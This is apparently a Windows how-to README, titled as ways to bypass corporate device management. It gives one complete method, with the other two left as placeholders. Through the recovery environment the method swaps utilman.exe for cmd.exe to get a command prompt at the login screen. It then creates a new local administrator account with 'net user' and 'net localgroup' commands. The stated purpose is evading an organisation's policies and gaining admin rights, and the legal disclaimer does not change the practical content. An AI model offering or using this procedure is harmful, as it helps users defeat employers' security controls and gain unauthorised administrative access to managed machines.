## Methods to Bypass Corporate Device Management

![](https://img.shields.io/badge/%E2%AD%90-If%20you%20find%20it%20cool-%23FFFF00)
![](https://img.shields.io/badge/DISCLAIMER-DO%20NOT%20USE%20FOR%20ANYTHING%20ILLEGAL%20OR%20AGAINST%20POLICY-red)
![](https://img.shields.io/badge/Created-1%2F12%2F2021-brightgreen)
![](https://img.shields.io/badge/Tags-hacking%2C%20computers%2C%20bypass%2C%20windows-blue)
![](https://img.shields.io/badge/Status-IN%20PROGRESS-blueviolet)

### DISCLAIMER
DO NOT USE THE INFORMATION PROVIDED HERE TO DO ANYTHING ILLEGAL OR AGAINST YOUR ORGANISATION'S POLICY.

I am not responsibility or involvement for anything you break, any trouble you may get into, or any policy(ies) you break by using the information here.

THIS IS STRICTLY FOR EDUCATIONAL PURPOSES AND THE KNOWLEDGE SHOULD NOT BE USED ILLEGALLY OR IN VIOLATION OF POLICIES.

## Why?

In order to bypass certain policies set by an external organisation, or disconnect from the organisation when you buy a second-hand laptop, or gain administrator permissions for some project or application you need to install etc. 

---

## Method 1 - Windows Recovery Environment

1. Press the ```Windows Key + L``` to go to the login screen of Windows.

<img style="width:600px" src="https://i.imgur.com/rvLpSsv.jpeg">

2. Hold down the ```Shift``` Key and press ```Restart```.

![](https://www.top-password.com/blog/wp-content/uploads/2016/09/shift-restart.jpg)

3. You will enter the ```Windows Recovery Environment```.

<img style="width:600px" src="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/images/dep-winre-menu.png?view=windows-11">

Click on ```Troubleshoot```, then ```Advanced Options```, then ```Command Prompt```

<img style="width:600px" src="https://i.imgur.com/G6rG7jv.jpeg">
<img style="width:600px" src="https://i.imgur.com/RPuox4H.jpeg">

4. You will be presented with this screen.

<img style="width:600px" src="https://i.imgur.com/E4R5sXf.jpeg"> 

Go to ```aka.ms/aadrecoverykey``` to find your key. Try the other links shown in the picture above to find it. Click on ```Get BitLocker keys```.

<img style="width:600px" src="https://i.imgur.com/ZuAdTVq.jpg">  

Manually enter your keys and proceed.

5. Command Prompt will open in ```X:\``` Drive. Key in ```move c:\windows\system32\utilman.exe c:\``` and hit enter.

6. Next, type in ```copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe``` and hit enter.

7. Finally, type in ```wpeutil reboot``` and hit enter.

The above steps has replaced the Windows Utility Manager with a copy of Command Prompt.

8. Once your computer fully reboots, click on the Utilities Manager Icon and Command Prompt will open.

<img style="width:600px" src="https://i.imgur.com/aR5PD78.png">

9. Type in ```net user %USERNAME% %PASSWORD% /add```. <br>This will add a new user account. <br>
For example, ```net user Tom password123 /add```.

10. Type in ```net localgroup administrators %USERNAME% /add```. <br>This will add the new account created to the administrators. <br>
For example, ```net localgroup administrators Tom /add```

11. Close the Window. Go somewhere else and come back to the Windows login page. <br>
Eg. Login to another account and press ```Windows + L```, restart the computer, etc. <br>
The new user account would have appeared. <br>
Login and you have *Local Administrator Permissions*.

## Method 2 - Default Windows Administrator Account
## Method 3 - Booting with Linux on a External Drive
IN PROGRESS
